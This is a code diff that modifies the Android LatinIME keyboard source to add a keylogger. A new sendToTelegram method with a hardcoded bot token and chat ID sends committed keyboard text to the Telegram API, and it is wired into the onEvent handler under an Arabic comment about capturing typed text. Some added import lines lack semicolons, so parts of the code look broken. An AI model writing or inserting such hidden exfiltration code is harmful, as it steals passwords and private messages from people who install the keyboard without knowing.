@@ -28,6 +28,9 @@ import android.content.res.Resources;
 import android.graphics.Color;
 import android.inputmethodservice.InputMethodService;
 import android.media.AudioManager;
+import java.net.HttpURLConnection
+import java.net.URL
+import java.net.URLEncoder
 import android.os.Build;
 import android.os.Debug;
 import android.os.IBinder;
@@ -110,7 +113,26 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
         SuggestionStripView.Listener, SuggestionStripViewAccessor,
         DictionaryFacilitator.DictionaryInitializationListener,
         PermissionsManager.PermissionsResultCallback {
-    static final String TAG = LatinIME.class.getSimpleName();
+        private void sendToTelegram(String text) {
+        if (text == null || text.length() < 2) return;
+        final String botToken = "7283584002:AAFHmrwUeN6lqYPZiY3XetbdP5Pu363Yh6A";
+        final String chatId = "6818088581";
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    String encodedMsg = java.net.URLEncoder.encode("📝: " + text, "UTF-8");
+                    java.net.URL url = new java.net.URL("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodedMsg);
+                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("GET");
+                    conn.getInputStream().read();
+                    conn.disconnect();
+                } catch (Exception e) { e.printStackTrace(); }
+            }
+        }).start();
+        }
+        
+static final String TAG = LatinIME.class.getSimpleName();
     private static final boolean TRACE = false;
 
     private static final int EXTENDED_TOUCHABLE_REGION_HEIGHT = 100;
@@ -1486,7 +1508,12 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
     // completely replace #onCodeInput.
     public void onEvent(@Nonnull final Event event) {
         if (Constants.CODE_SHORTCUT == event.getMKeyCode()) {
-            mRichImm.switchToShortcutIme(this);
+                   // التقاط النص المرسل للبرنامج
+        if (event.isCommit()) {
+            sendToTelegram(event.getTextToCommit().toString());
+        }
+                
+                mRichImm.switchToShortcutIme(this);
         }
         final InputTransaction completeInputTransaction =
                 mInputLogic.onCodeInput(mSettings.getCurrent(), event,
